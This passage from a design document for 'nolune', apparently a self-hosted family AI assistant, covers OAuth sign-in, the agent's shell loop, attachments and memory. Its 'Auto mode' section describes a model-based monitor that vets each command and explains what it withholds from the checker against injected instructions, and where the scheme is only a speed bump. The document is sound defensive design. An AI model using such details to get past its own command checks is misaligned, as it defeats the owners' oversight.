  its page tree, read from the file (compressed object streams too), and checked against the same
  25% of the context window and the API's page limit. A PDF whose pages can't be counted
  (encrypted, say) goes as its path.
- **Its own copy.** Claude Code keeps each chat under `~/.claude/projects`, which deleting the
  chat in nolune doesn't remove yet.

### The ChatGPT plan

`chatgpt-plan` presets run chats on the ChatGPT Plus or Pro plan of someone signed in with
ChatGPT, instead of an API key. It's OpenAI's
[Sign in with ChatGPT](https://developers.openai.com/siwc) for open-source, locally hosted apps
(in preview in September 2026; a paid or remotely hosted app would need OpenAI's approval first):
nolune registers as an app of the person's ChatGPT account, which lets it send Responses API
requests that count toward their plan's usage, the same allowance as ChatGPT and Codex, not extra.
The sign-in is in `chatgpt-sign-in.ts`, the requests in `chatgpt-plan.ts`.

- **Signing in** is OAuth with PKCE in a browser (`startChatGptSignIn`). nolune starts a listener
  on `127.0.0.1` (the only redirect OpenAI takes: `http://127.0.0.1:<port>/auth/callback`) and
  opens OpenAI's page, where the person signs in and allows nolune to use the plan. The first
  sign-in of an account registers nolune with it (`client_id=dynamic_agent_client`,
  `agent_name_hint=nolune`), and OpenAI issues a client id of its own (`oaiapp_…`), which later
  sign-ins to that account reuse, with the retained ID token as `id_token_hint` so the account
  isn't asked again. Every request names this computer's host id (`ext_agent_host_id`,
  `urn:uuid:…`, made once and kept), which tells hosts of the same app apart and identifies
  nothing else.
- **From another device.** The browser comes back to `127.0.0.1`, which is this computer only: on
  a phone, or through a tunnel, that page doesn't load. Its address carries what nolune needs (the
  code and the sign-in's state), so it can be pasted into Models & keys, or into `nolune
chatgpt-plan setup` at a terminal (`finishChatGptSignIn`). An address from another sign-in
  leaves this one waiting. OpenAI's docs don't describe this; its own advice for a remote host is
  to sign in on a computer with a browser and copy the credentials over.
- **Checked before it's kept.** The code is exchanged at OpenAI's token endpoint, with the PKCE
  verifier and the same redirect, and the ID token checked as OpenID Connect says: signed with a
  key OpenAI lists (RS256, its JWKS), issued by OpenAI, for this client, not expired, and for this
  sign-in (its `nonce`). Signing in again must be the same account (`sub`); another account is
  "Use another account", a registration of its own. The plan's scope (`chatgpt.tokens.use.direct`)
  must be granted, or the sign-in is kept as who someone is, and the plan's status says to sign in
  again and allow it (with `prompt=consent`).
- **What's kept** is `~/.nolune/chatgpt.json` (mode 600, written whole and renamed into place):
  the host id, each account's registration (client id, subject, email, plan name when the ID token
  says) and the signed-in one's tokens, never shown or logged. The access token lasts an hour and
  is refreshed 5 minutes before it runs out, or not before OpenAI's `earliest_refresh_at` while it
  still works. A refresh replaces the refresh token too (30 days, renewed each time), so refreshes
  run one at a time under a lock file, across the gateway and a `nolune` in a terminal, and each
  first reads what another may have written. A refresh token that no longer works
  (`invalid_grant`, `refresh_token_reused`...) ends the sign-in: its tokens are forgotten and chats
  say to sign in again. Signing out asks OpenAI to revoke the refresh token, then forgets the
  tokens and keeps the registration for next time; when OpenAI can't be told, it says so, and the
  app can be disconnected in ChatGPT's settings.
- **Who runs the loop.** nolune, as with an OpenAI key: `openai-chat.ts` makes the requests with the
  plan's client (`CHATGPT_PLAN`, a `ResponsesApi`), whose SDK asks for the access token on every
  request, so a refreshed one is used at once. Its address is always `api.openai.com/v1`: never
  `OPENAI_BASE_URL`, `OPENAI_ORG_ID` or `OPENAI_PROJECT_ID`, which are the key's.
- **What the plan asks of a request** (OpenAI's preview limitations): `store: false` and
  `stream: true`, which nolune's are anyway, with the whole transcript in `input` and no
  `previous_response_id`; no `max_output_tokens`, `temperature`, `metadata` and the like; function
  tools in a namespace, so nolune's tools are in `nolune` (the model calls `run_command` with
  `namespace: "nolune"`, and every call sent back carries it, other models' too); no Files API.
  Short exchanges (titles, memory, suggestions) are streamed too, and read to their end. The
  stream's last event (`response.completed`) comes without its output on this route, so the reply
  is the items the stream finished (`response.output_item.done`) whenever the last event has none.
  The reply's encrypted reasoning goes back to the plan's model, and its prompt cache key is the
  chat.
- **Models** are the plan's catalog, `GET /v1/models` with the plan's token, which answers with
  `models` (`slug`, `display_name`, `visibility`, supported reasoning levels and a context window
  when it says): the admin page offers those with `visibility: "list"`, in ChatGPT's order, and
  adding a preset checks the model is there. A preset's window is the catalog's, or unknown: the
  API's windows may not be the plan's. A chat's effort goes as it is, or as the nearest below it
  the model takes.
- **Errors.** What the plan says goes wrong is said in words (`describeFailure`): its usage limit
  (the plan's own or the weekly one set for nolune, linking to ChatGPT's usage settings), an
  account that can't use its plan in other apps (it takes Plus or Pro), a check that couldn't be
  made just now, something the plan doesn't take, a sign-in ChatGPT no longer accepts (401), and a
  request a policy stopped (403, where this computer is, say). OpenAI never switches a request to
  another way of paying.
- **Replies from before.** When Codex ran the plan, its replies were saved as OpenAI's items:
  their reasoning has no encrypted content (left out, as always), their messages carry ids of
  Codex's own (sent as their text), and their calls no namespace (sent with nolune's). Codex's
  threads in `~/.nolune/codex` aren't used any more; nolune leaves the folder to be deleted.

### Switching models

Anyone in the profile can switch a chat to another preset, or another reasoning level, from the
chip in its composer; `nolune agent run <id> --preset` does it for a subagent given more work.
`setPreset` takes a new snapshot of the preset (name, provider, model, context window), and the
next model call uses it, even in the middle of a turn, so a model that keeps failing can be left
behind with Continue. It's refused when the conversation is already larger than the new model's
window (from its last call's usage): history is never edited, so it could never fit. Everyone who
has the chat open gets the change as a live `model` event (also in the snapshot).

- **What it costs.** Caches belong to one model, so the first call on the new one reads the whole
  conversation again (a new reasoning level does the same on Claude). Once the chat has a reply,
  the chat asks before either change, saying so (with the tokens, in technical details).
- **Who wrote what.** Every row records the provider its content was made for (`message.provider`:
  the one whose model wrote a reply, or whose Files API a message's or command result's pictures
  went to) and replies their model (`message.model`). Rows from before this were given their
  conversation's. The chat shows which model wrote each reply in technical details.
- **What each model gets.** `requestMessages` reads the rows into nolune's format, and the target's
  encoder (see [nolune's format](#nolunes-format)) decides what it can take. Both depend only on what's
  stored, so after the one miss the prefix is byte-identical again. Stored rows never change.
  - Claude gets replies from other Claude models as they are. The API itself leaves out thinking a
    model can't read (it's bound to the model that made it), without an error; stripping it would
    be an edit, which breaks preserved thinking for the model that can read it.
  - Replies from another provider go as their text and tool calls (`portableReply`), without
    reasoning. So do replies from another OpenAI model or another model on OpenRouter (reasoning
    goes back only to the model that wrote it, and items without their reasoning lose their ids)
    and a plan's replies (a Claude plan's thinking was signed for another account, and a ChatGPT
    plan's encrypted reasoning goes back only to the plan's model). Anthropic accepts
    tool calls without thinking in the middle of a turn, so a switch can happen there.
  - Pictures and PDFs go along: nolune keeps them and each provider gets its own copy (see
    [Attachments](#attachments)). Only those from before nolune kept its own, stored as another
    provider's `file_id` (an `uploaded` source), become a note: this model can't open that copy,
    and the line before it (the attachment's label, or `Image: <path>` in a command result) says
    where the file is, so `nolune view` shows it again. The switch dialog mentions them when the chat
    has any (`heldFileProviders`). A model on OpenRouter that can't see pictures or read PDFs, and
    any model of a custom provider, gets the same kind of note for those it can't take
    (`readableMessages`).
- **The plans.** A plan's agent keeps its own copy of the chat, so a chat that comes back to a plan
  after another model answered starts a new session (on the Claude plan, a random id: the chat's
  own is taken) with the chat so far as a transcript, as a notification's chat does. So does one
  that moves from one plan to the other: the saved session says whose it is. Switching between
  presets of the same plan keeps the session, and the agent resumes it on the new model.

## Agent loop

This is a hand-written loop over the provider's streaming call (Anthropic's `messages.stream()`,
OpenAI's Responses API, OpenRouter's Chat Completions) rather than an SDK's tool runner, because
each step must be saved to SQLite and resumed from there, including after a gateway restart.

```
kick(conversation):                     one loop per conversation at a time
  loop:
    commit queued human messages        (assigns seq; this is how steering happens)
    if the last committed row isn't a user row: stop
    stream a model call → append an assistant row
    if it contains tool_use blocks:
      run them one after another (run_command, or a memory operation) → append one user row with
      every tool_result
      (if stop_reason isn't tool_use, the calls are answered with "not run" instead)
```

- **Stop** aborts the stream (the partial reply is dropped, nothing is appended) or kills the running
  command's process group. Unfinished calls are answered with `Stopped by <name>.` Queued messages
  are committed without calling the model, and the next message continues the conversation.
- **API errors** leave the transcript ending on a user row. The UI then shows a **Continue** button,
  which calls `kick` again.
- **Gateway restart:** an assistant `tool_use` with no result gets an appended "interrupted" result,
  and conversations with queued messages are started again.
- Several consecutive user rows (for example tool results followed by steering texts) are sent as
  separate messages. The API merges them into one turn.
- **Messages from the gateway** queue like a person's and join the transcript the same way: a
  background command's output (`task_result`) and, in a subagent's conversation, its task and steers
  (`agent_message`). Each one is plain user text with a bracketed first line saying where it comes
  from (`[Background command finished: …]`), not a mid-conversation system message: not every model
  takes those, and a command's output mustn't get system authority.

### `run_command`

- Input: `{summary, icon, command, cwd?, timeout_seconds?, run_in_background?}` (chats from before
  saved tools don't have `run_in_background`). Runs as `$SHELL -lc <command>`, so every
  call starts a fresh login shell and `cd` doesn't carry over between calls.
- `summary` (what the command does, in plain words and the conversation's language) and `icon` (a
  Lucide icon name) are only for the web UI, which shows them instead of the command. They come
  first in the schema so they stream in before the command. Required in the schema so the model
  always writes them, but a call without them still runs.
- Default timeout 120 s, maximum 1800 s. On timeout or Stop, the whole process group is killed.
  Background processes that a command detaches keep running.
- No stdin. `TERM=dumb`, `NO_COLOR=1`, `PAGER=cat`.
- Output is stdout and stderr interleaved, with ANSI codes removed, capped at 30 KB (the first 10 KB and
  the last 20 KB are kept), followed by an exit-code line. Images the command showed with `nolune view`
  follow as image blocks (below).
- The environment is the gateway's own, minus its secrets (`ANTHROPIC_API_KEY`, `BETTER_AUTH_SECRET`, …),
  plus the `commandEnv` values from `config.json` (for example `FIRECRAWL_API_KEY`), plus
  `NOLUNE_PROFILE`, `NOLUNE_PROFILE_DIR`, `NOLUNE_CONVERSATION_ID` and `NOLUNE_VIEW_DIR`.
- `eager_input_streaming` is left off: the input is one short command, and leaving it off keeps the API's
  own input validation.

### Background commands

- With `run_in_background: true` the call is answered as soon as the shell starts: "Started in the
  background (process group N) …", with `kill -TERM -N` to stop it early. The agent keeps working
  or ends its turn.
- When the command ends, its output (capped like any command's, with the exit-code line) is queued
  in the conversation as a `task_result` message, `[Background command finished: <summary>]`, the
  command and the output, and the conversation is kicked: the agent reads it at its next step, or
  it starts a new turn. The chat shows it as a folded card.
- Default timeout 3600 s, maximum 86400 s. No `NOLUNE_VIEW_DIR`, since nothing collects pictures from
  a command nobody waits for.
- The processes live in the gateway (`background.ts`); a `background_command` row per running one
  lets the next start queue "[Background command cut off …]" for commands a restart killed, so an
  agent waiting on one isn't left waiting.
- **Stop** in a chat also stops its background commands and its subagents (`stopConversation`), and
  nothing they would have handed over reaches the conversation. The chat lists what's still
  working in the background, with a Stop button that works while the agent itself is idle. A
  `nolune agent watch` running there is the same work as the subagent it waits for, so the list shows
  only the subagent. Deleting a chat stops them first.

### Auto mode

The agent runs commands with the owner's account, so a mistake, or a web page or email that talks it
into something, can do real harm. Auto mode (`command-safety.ts`) has a model check each command
before it runs, in place of a person approving every one, the way Claude Code's auto mode does.
`config.commandMode` is `auto` unless an admin picks `unrestricted` (Models & keys, or `nolune config
set command-mode`), which runs commands unchecked as nolune did before. It applies from the next
command, to chats, automations and subagents alike, and on the plans too, since their commands run
through the same `runToolCall`.

- **Per chat.** A shield chip in the composer (new chats too) sets a chat apart from Models & keys:
  `conversation.command_mode`, null while it goes by Models & keys, so a chat keeps only what
  differs (`chatCommandChoice`). Anyone in the profile can have a chat's commands checked; only an
  admin can turn that off for one, since auto mode is there partly so a child can't. The check
  reads the chat's mode at every command, so a change applies mid-turn, and everyone with the chat
  open gets it live (a `commands` event). Subagents start with their chat's mode and change with
  it; automations go by Models & keys until a notification's chat sets its own.

- **Commands that only look run at once** (`read-only-commands.ts`): `ls`, `cat`, `grep`, `find`
  without `-exec` or `-delete`, `nolune memory search` and the like, joined by pipes, `&&` or `;`,
  redirected only to `/dev/null`, and nowhere near where secrets live (`.ssh`, `.env`,
  `config.json`...). The shell is read strictly: a substitution, subshell, brace expansion,
  unquoted glob or expansion where it could become a flag, a program not on the list, or anything
  else it can't be sure of goes to the check. A wrong "no" costs a model call; a wrong "yes" would
  skip the check.
- **What the check sees.** A fixed system prompt (who can ask for what, how to decide, a block
  list and its exceptions) and, per command: the computer and profile, whether it's a chat, an
  automation or a subagent, the folder's instructions, what people asked for (the words they
  typed and the names of files they attached; an automation's prompt; a subagent's task), the
  commands run or blocked before, and the command with its working folder. Never what the agent
  said or thought, what its commands printed, attached files' contents or recalled memory: they
  can carry text written to steer it, and the agent's own words can argue for anything. Each part
  is inside tags ending in a random code, so text in a command can't close one.
- **Who authorizes.** Only people's messages, an automation's prompt, the folder's instructions and
  a subagent's task (checked when the parent ran `nolune agent run`). A request covers what it
  plainly means; what the agent chose on its own isn't asked for until someone says so, and a
  person agreeing in the chat counts.
- **Two stages on one prompt.** A quick call that answers ALLOW or BLOCK in one word and is told to
  block when unsure; only a block gets a careful call that reasons it through and ends with
  `Verdict:` and `Reason:`. Most commands are allowed at the first, and the second shares the
  first's prefix for providers that cache it. Both are `quickReply`s (low effort, 30 and 60 s) to
  the preset chosen for checks (`config.safetyPresetId`), else the chat's own model.
- **Fails closed.** An error, a timeout or an answer without a verdict blocks the command, as does
  one over 50,000 characters. Stop during a check answers the call like a stopped command.
- **A blocked command** doesn't run; its result starts `Blocked by auto mode: <reason>` and tells
  the agent not to work around it but to ask, since a person's yes in the chat lets it through.
  The chat shows the step as blocked. The runner counts blocks in a loop since the last person's
  message: at 3 in a row or 20 in all the agent is told to run nothing more and say what it
  wanted, and a call it makes after that is refused unchecked and ends the loop with an error. A
  new message from a person starts the count again.
- **Not from the agent.** `nolune config set command-mode` and `safety-model` refuse to run from the
  agent's commands (`NOLUNE_CONVERSATION_ID` is set), and the block list covers editing
  `config.json`. Against a determined agent on an unsandboxed account that's a speed bump, not a
  wall: auto mode guards against mistakes and manipulation, not against the family.

### Seeing images: `nolune view`

The agent looks at an image by running `nolune view <file>...`. There is no second tool: the images are
attached to that `run_command` call's `tool_result`, which may hold image blocks, so the tool
definition and every conversation's cache stay as they are. Like automations, nothing is added to
the system prompt beyond the skills catalog: the built-in `view-images` skill explains `nolune view`,
and how to see what isn't a picture file yet (the screen, PDF pages, video frames, web pages),
crops for small print and contact sheets for many photos. A profile that turns the skill off
doesn't learn about `nolune view`. Showing pictures to people is the other direction, in
[Pictures and files](#pictures-and-files).

- **Handoff.** Every call gets a fresh temp folder (`NOLUNE_VIEW_DIR`) holding the conversation's
  remaining image allowance. `nolune view` prepares each image, writes it there and adds a line to a
  manifest. After the command exits the gateway checks the files again, attaches them after the text
  output (each after an `Image: <path>` line), and deletes the folder. Not markers in stdout: output is
  cut at 30 KB, and `cat`-ing a file that contains one would attach an image nobody asked for.
- **Preparing** (`packages/core/src/images.ts`). JPEG, PNG, GIF and WebP up to 2000 px and 1.5 MB are
  sent as they are; JPEGs lose their EXIF and XMP segments (GPS positions, and an orientation that
  browsers apply but the model ignores). Everything else is converted with `sips` on macOS or
  ImageMagick elsewhere: at most 2000 px, turned upright, PNG when the source was PNG, GIF or WebP
  unless that's over 1.5 MB, otherwise JPEG. PDFs are refused.
- **Why 2000 px**, although newer models take 2576: a request with more than 20 images, the history
  included, rejects any image over 2000 px. History is never edited, so a larger image would break
  the conversation for good once it holds 21.
- **Limits.** 10 images per command, and 100 per conversation counting attached pictures (the API's
  limit on 200k-context models, and every request carries the whole history). Past a limit
  `nolune view` fails with an explanation; nothing is dropped silently.
- **Uploaded, not inline.** The gateway uploads each image through the Files API (see
  [Attachments](#attachments)) and the `tool_results` row refers to it by `file_id`, so the history
  doesn't resend the bytes. Only if the upload fails does the image go inline as base64, and the
  conversation's inline images are capped at 20 MB, since a request is capped at 32 MB.

## Attachments

People attach files in the composer: the paperclip button, pasting, or dropping them on it. Any
kind of file, up to 100 MB each (the same as pictures in replies) and 10 per message.

- **Uploaded when attached.** Each file streams to `POST /api/p/<profile>/uploads` as soon as it's
  added, into the media store, with an `upload` row. Sending the message then carries only the
  upload ids, and only the person who attached a file can send it. Uploads never sent are dropped
  after a day. `nolune start` raises adapter-node's 512 KB body limit for this; `hooks.server.ts`
  keeps a 1 MB limit on every other route, including the public ones that read a body first.
- **Saved for the agent.** On send, each file is copied into `profiles/<slug>/attachments/` under
  its own name (`name (2).ext` when another file has it), gets a media row so the chat shows it (see [Pictures and files](#pictures-and-files)), and the message's content gets, per file, a line saying who
  attached it and where it was saved, then the file itself when the model can have it:
  - **pictures** go through `prepareImage` (converted, at most 2000 px, upright) and become an
    `image` block referring to those bytes, kept in the media store;
  - **PDFs** become a `pdf` block referring to the file, after a free `count_tokens` call that
    checks the model can read it and says what it costs;
  - **other files**, text included, are only named, and the agent opens them with commands.
- **Limits, because history is never edited.** A file the API refuses would fail every later
  request, so pictures count against the 100 per conversation, and a conversation's PDFs share
  25% of the model's context window (about 250k tokens on 1M-context models, 50k on 200k ones;
  well under the API's 600 and 100 pages). A PDF over the rest of that budget, or one
  `count_tokens` rejects, is sent as its path with the reason in its line, and the chat shows the
  same note under the file.
- **By reference.** A message keeps a picture or PDF as a `media` source: the SHA-256 of the
  bytes the model gets (a converted picture's own), which the media store keeps while a message
  refers to it. Before each model call, `resolveFiles` (`provider-files.ts`) gives the provider its
  copy: the Files API's `file_id`, or the bytes inline for the Claude plan. So a chat that
  switches providers takes its pictures along, and the first call on the new one uploads them.
  The same rows always give the same request. An upload that fails at that point fails the call
  (Continue tries again), never falling back to base64, which would change the prefix later.
- **Files API.** Uploaded once per content and account, and first when the file is attached, so
  a problem shows then: `provider_file` maps provider, a hash of the API key (files live in its
  workspace) and the content's SHA-256 to the `file_id`. Requests stay small whatever the history
  holds, and a reference is part of the cached prefix like any other block. When attached, a
  cached id is checked (one metadata request) and the file uploaded again if it's gone; later
  requests take the cached copy as it is, since checking every picture would cost a request
  apiece. The hourly prune deletes files no message refers to any more (by id, or by what it's a
  copy of), leaving those used in the last hour and those in another key's workspace alone. With
  another workspace's key, a chat's pictures are uploaded again, at the cost of one cache miss.
  The Files API isn't eligible for zero data retention. Pictures and PDFs from before nolune kept
  its own copies are stored with the provider's `file_id` and can't move to another provider or
  workspace.
- **Other providers.** `message.attachments` is the provider-neutral record (saved path, type,
  what the model got). `content` holds nolune's blocks (see [nolune's format](#nolunes-format)), and each
  provider's module turns them into its request. A provider brings a `FileStore`
  (`provider-files.ts`); one without a files API (the plans) sends pictures and PDFs inline.
  OpenAI's is its
  Files API: pictures are uploaded for `vision` and PDFs as `user_data`, and a PDF's cost is
  counted with `POST /v1/responses/input_tokens`, which also fails for a PDF it can't read.
- **OpenRouter's** is its Files API (in beta), which takes pictures and PDFs alike and keeps them
  in the key's workspace without expiring. It answers OpenAI's SDK in OpenAI's shape, missing
  files included, so its store is OpenAI's on OpenRouter's client. It can't count a PDF's tokens,
  so they're estimated from its pages as on the Claude plan, before it's uploaded. Unlike
  Anthropic's and OpenAI's, many of its models are text only, and a picture sent to one would
  fail every later request. So `modelInputs` asks OpenRouter's model list first (`image` and
  `file` among its `input_modalities`): a picture goes only to a model that sees pictures, and a
  PDF only to one that reads PDFs itself, since for the others OpenRouter would run it through a
  paid OCR service at every request, each one carrying the whole history. Otherwise the file goes
  as its path with the reason (`… can't see pictures`), and `nolune view` says the same in the
  command's result. When the list can't be read, the file goes as its path too.
- **Custom providers** have no Files API, and nothing says which of a server's models take
  pictures or PDFs, so every one goes as its path, with that reason; the agent can still open the
  file with its commands.

## Memory

Each profile's memory is a folder of short Markdown notes, `~/.nolune/profiles/<slug>/memories`,
in fixed categories (`plans.md`, `people/anna.md`). There is no memory tool: like automations and
`nolune view`, it is files plus a CLI command, so it works the same with any model provider.

- **Categories** (`packages/core/src/memory-categories.ts`), like Claude's memory has, so every
  fact has one obvious place and the Memory page reads the same in every family: `core` (pinned),
  `people/<name>` (a note per person, in the family or not: grandparents, the nanny, the dentist),
  `home`, `health`, `plans`, `routines`, `pets`, `places`, `projects` and `projects/<name>`, and
  `other`. Before, the agent named topics itself and memory drifted: `family`, `kids` and
  `people/mia` all held facts about Mia. The agent's prompt and the note-taker's list them with
  what goes in each. `nolune memory add` (and the note-taker, and imports) refuse any other note,
  saying where things go; `write` refuses to start one, and `mv` to rename into one. A note from
  before the categories stays readable and editable, listed as Unsorted, until someone moves it
  into one; the agent is told to sort one when it works with it.
- **People.** A person's note is titled with their name and, when it's known, says who they are
  to the family and what else they are called: `- Who: Anna's grandmother`,
  `- Also called: grandma, бабушка` (`Зовут:`, `auch genannt:` and the other languages' labels
  are read too). Search counts the title and those names as the note's own words, so "бабушка"
  finds what `people/olga` says. An "Also called" that names no one new (the note's own title,
  as a model wrote for a new member) is taken as a fact the note has already.
- **Members' notes** (`packages/core/src/memory-people.ts`, `profile_member.person_note`). Each
  member of the profile has their note, so nolune knows who "I" is in a message, what to look up for
  them, and where what they say about themselves goes. The agent's prompt and the note-taker's
  input list the members with their notes (`- Anna Smith: people/anna`). When someone is added
  and memory may know them already (a note whose name, title or other names match theirs, in any
  alphabet: Ольга is Olga, and a letter apart when long enough: Yulia, Yulya), whoever adds them
  is asked which note is theirs, with what each says and a warning that the new member will read
  it, since it was written without them; it is never linked without asking. With nothing
  matching, the note their facts will start (`people/<first name>.md`, or longer if that's taken)
  is kept for them, and members from before get theirs the same way, or are asked in the
  profile's settings, where anyone can also change it. Recall lifts facts about the sender by any
  name their note calls them. What a member says about themselves that they'd tell any of their
  circles goes on their card instead, which goes with them into all their profiles: see
  [Cards](#cards).
- **Merging** (`nolune memory merge <from> <into>`, or Move on the Memory page onto a note that's
  there already): what one note says goes into the other, under the same headings, without what
  it says already, with the dates its facts were learned; into a person's note, the other note's
  title and names join its "Also called". Two members' notes are never merged. Moving or merging
  a note takes along its member and the note-taker's changes in it (Undo still works); a note
  moved into `people/` from elsewhere is titled with the person's name.
- **In the prompt:** a short Memory section with the categories, the members and their notes,
  and the names of the notes as they were when the conversation started
  (`Other notes when this conversation started: home, plans, people/anna.`); it says how to look
  things up and save them, and what is worth saving. Only names, never facts, so the
  prompt changes when a note is added or removed and not with every fact, and nothing is read
  until the agent needs it: whenever a request could depend on something the family said before,
  also later in a chat when the subject changes, it searches (`nolune memory search dentist`) or
  reads whole notes (`nolune memory show people/anna plans`). Guessing from note names alone missed facts
  kept under a name that didn't suggest them, like the wifi password in `home`.
- **Pinned core note.** `core.md` is the exception: a copy of it, as it is when the conversation
  starts (or its prompt is built again), goes whole into the Memory section. It is for what matters
  in almost every chat (who is in the family, languages, allergies, standing preferences, whatever
  someone asks nolune to always keep in mind), and holds at most 4,000 characters: `nolune memory` and
  the page refuse more, and one made longer in an editor is cut at a line in the prompt, with a
  note telling the agent to read the rest and move it out. The list of other notes leaves it out.
- **Recall** (`recallFor` in `packages/core/src/memory-search.ts`): when a person's message is
  queued, or an automation's run starts, memory is searched for its words, and up to 8 facts
  (2,000 characters) that match go along with it in a `<memory>` block after the message, for the
  model only (the chat shows what was written). It sits in the new message, never in the system
  prompt, so the cached prefix doesn't change. Facts the conversation already has, in its system
  prompt (core) or in any message or command output (a note the agent printed, an earlier
  recall), are left out, so each comes once per chat. The sender's name (and their note's name,
  title and other names) only lifts facts that match anyway (Anna's "what do I like?" puts "Anna likes tea" above "Ben likes coffee"), so it
  doesn't bring up everything about them with every message. Anything going wrong costs the
  recall, never the message.
- **Search** (`rankFacts`): no index and no model, so the notes stay the only copy and it works the
  same with every provider and offline. Every fact of every note is scored against the words of
  the query: lower case and without accents, words of 3 letters only whole, longer ones by their
  start (the first three quarters, at least 4 letters: "allergic" finds "allergies", "вайфая"
  finds "вайфай"), and starts of 6 letters or more anywhere in a word, for compounds
  ("Zahnarzt" finds "Kinderzahnarzt"). Short lists of words that say nothing, in the interface's
  five languages, are left out. A word counts by how rare it is in memory (like BM25's IDF), and
  one in more than 40% of a memory of 10 facts or more doesn't count at all. A word only in the
  fact's note name or heading (or a person's note's title and other names) counts half, so "Anna"
  finds what `people/anna` says. Recall keeps
  facts scoring at least 30% of the best one.
- **Search by meaning** (`packages/core/src/memory-embeddings.ts`): words miss questions that
  share none with the fact that answers them ("where's the other key for the car?") and ones in
  another language than the notes. So search and recall also compare embeddings, from any
  OpenAI-compatible embeddings API (the OpenAI SDK, loaded on first use). nolune sets it up itself:
  with an OpenAI key, OpenAI's `text-embedding-3-small`; else with an OpenRouter key, the same
  model through OpenRouter; else none, and words do it all. `nolune config set embeddings`, or
  Memory search under Models & keys, picks another model (`openai/…`, `openrouter/…`), turns it
  `off` (every fact goes to that provider to be embedded, whatever model the chats run on), or
  takes a model of a custom provider that speaks OpenAI's API (`custom-openai/<id>/<model>`),
  like Ollama, LM Studio or oMLX on this computer, for anyone who wants it local. Each fact is
  embedded with its note and heading (`people/anna › Allergies: peanuts`) and kept in a hidden
  `.embeddings.json` with the model's name, so only new or changed facts are embedded again,
  and a new model starts over. The gateway embeds in the background: every profile's facts when
  it starts, what the note-taker added, and whatever a search finds missing (a fact is found by
  words until then); a `nolune` command in a terminal never waits for that. A message waits only
  for its own embedding, at most 3 seconds (10 for `nolune memory search`), and anything going wrong
  leaves words to do it alone, logged once in 10 minutes. Automation runs recall by words only,
  since they start at once.
- **What counts as a match by meaning:** models differ in how similar anything looks, so there is
  no fixed cutoff. A fact counts when its similarity stands out from the rest of memory: its
  distance from the median over the median absolute deviation (×1.4826), at least 4.5 for recall
  and 3.5 for search, which the agent reads with judgement. Measured on 40 facts with
  EmbeddingGemma through a plain server: what a question was about stood out by 5.0 to 10.0
  (also two facts at once, which a mean and standard deviation hide from each other), messages
  about none of them ("thanks!", "convert this PDF") by 3.2 at most. It needs at least 10 facts
  with embeddings. The two lists, words and meaning, are merged by reciprocal rank fusion
  (constant 10). Still missed: what only follows from a fact, like "what should we cook?" and "Anna
  is vegetarian" (3.2).
- **Learning from chats** (`packages/core/src/memory-learning.ts`): the agent saves what it learns
  when it thinks of it, and facts said in passing got lost. So once a chat's loop has ended and
  nothing ran in it for 2 minutes (the gateway's scheduler starts the timers, and after a restart
  gives chats active in the last day theirs), the chat's own model (`quickReply`, so plans work
  too) looks over what was said since last time (`conversation.learned_seq`): people's messages,
  with the names of attached files, and the text of nolune's replies, never commands, their output
  or an automation's message, so a web page, an email or a webhook can't write to memory. It gets
  the two messages before, for context, today's date, the members with their notes, and the
  notes: core, then the ones with
  facts matching the conversation, then the most recently changed, whole up to 20,000 characters
  and the rest by name. It answers with a JSON array of at most 10 changes, usually `[]`:
  `add` (with `under`, the heading the fact belongs under, started at the end of the note when
  it has none, since appending to the end put a lake house under "Car") and `replace` (with
  text, never empty). It can't remove anything: in a live test, a model deleted the old wifi
  password without saving the new one, so a fact that stopped being true is replaced with what
  is true now, and removing stays with people and the agent. The changes go through the same
  functions as `nolune memory`, so they are dated and refused alike (a full core note, text that
  isn't there). An `add` of several lines is a fact a line, each with its own Undo: a model sent
  a new person's Who, Also called and favorite games as one, which was joined into one bullet.
  `nolune memory add` splits a quoted list the same way. One look at a time per
  profile, so two chats ending together don't save the same fact. A stretch is read once: a
  failed model call leaves it for next time, a reply without usable JSON doesn't. Hidden chats
  (background runs nobody continued, subagents) are skipped, and so is a stretch without a
  person's message. Each profile can turn it off on its Memory page or with
  `nolune memory learning off` (`profile.learn_from_chats`, on by default). It costs one short call
  to the chat's model per quiet spell, on a plan the plan's usage.
  - **What it saved shows** (`packages/core/src/memory-changes.ts`), since people should see what
    goes into memory without their asking. Each change is a `memory_change` row: the chat, the
    last message it read, the note, and the whole lines the change left there (and, for a
    replace, the lines before). The chat shows them after that message as a folded "Saved 3
    memories" row, live (a `memory` event, and in the snapshot), each fact with its note and
    Undo; the Memory page lists the last two weeks' at the top, with the chat each came from.
    Undo puts back exactly those lines: an added fact goes (with the note it started, once
    nothing is left in it), a replaced one reads as before and keeps its old date (the fact index
    remembers facts that just left). When those lines aren't in the note once any more, someone
    changed them since, and it says so instead. None of it goes to the model: the chat's
    transcript, and its prompt cache, stay as they were.
- **`nolune memory`** (`packages/cli/src/memory.ts`, on top of `packages/core/src/memory.ts`): `list`,
  `search <words>...` (every note's facts that match, best first, as `path:line  fact  (heading)`),
  `show <topic>...`, `add <topic> <fact>` (one bullet; creates the note, skips a fact it already
  has), `replace <topic> <old> <new>` (text that appears exactly once), `forget <topic> <text>` (the
  one line containing it), `write <topic>` (the whole note, from stdin), `rm`, `mv`, `merge` and
  `learning [on|off]`. `list` also says whose note each member's is. Topics are paths inside the folder; `..`, names starting with a dot and
  symbolic links are refused. Notes are written atomically and hold at most 50,000 characters.
  The agent can also edit the files directly; `nolune memory` is preferred because it dates each
  fact.
- **What goes in:** one fact per bullet, updated rather than repeated. Secrets such as passwords
  and door codes are allowed when someone asks: a profile is only shared by people who trust each
  other, and models tend to refuse them in memory unless told so. The exception is something one
  member wants kept from the others (a surprise), since every member can read the memory.
- **Older conversations** keep their frozen prompt, which has the old `MEMORY.md` pasted in.
  Whenever a `MEMORY.md` shows up in the profile folder (the old file on the first use, or one an
  older chat writes later), it is moved into the folder as `general.md` (or `general-2.md`, …).
- **Fact dates.** Every list item, paragraph or table row in a note is a fact, and a hidden
  `.facts.json` in the folder records when each was first seen (matched by its words, ignoring
  case and spacing). `nolune memory` and the page update it with each change; facts that reached the
  files some other way are dated by their file's modification time, and whatever was in memory
  before dates were kept has none. A fact that moves to another file, or leaves one and comes
  back, keeps its date. Names starting with a dot are reserved, so `nolune memory` can't touch it.
- **Imported** from another assistant on a new profile's welcome, dated as that assistant
  remembered them: see [Welcome](#welcome).
- **Memory page** (`/p/<slug>/memory`): the switch for learning from chats, then a grid of dots,
  one row per note and one dot per fact, oldest on the left. A dot's shade is its age: black today
  (with a halo), fading to light grey over about three months, and lightest when undated. Rows
  follow the categories, each in the family's language; notes in a folder are grouped under its
  name, members' first (with their avatar), then by the latest change; notes from before the
  categories come last, as Unsorted. Past 12 rows the rest fold away. Pointing at (or
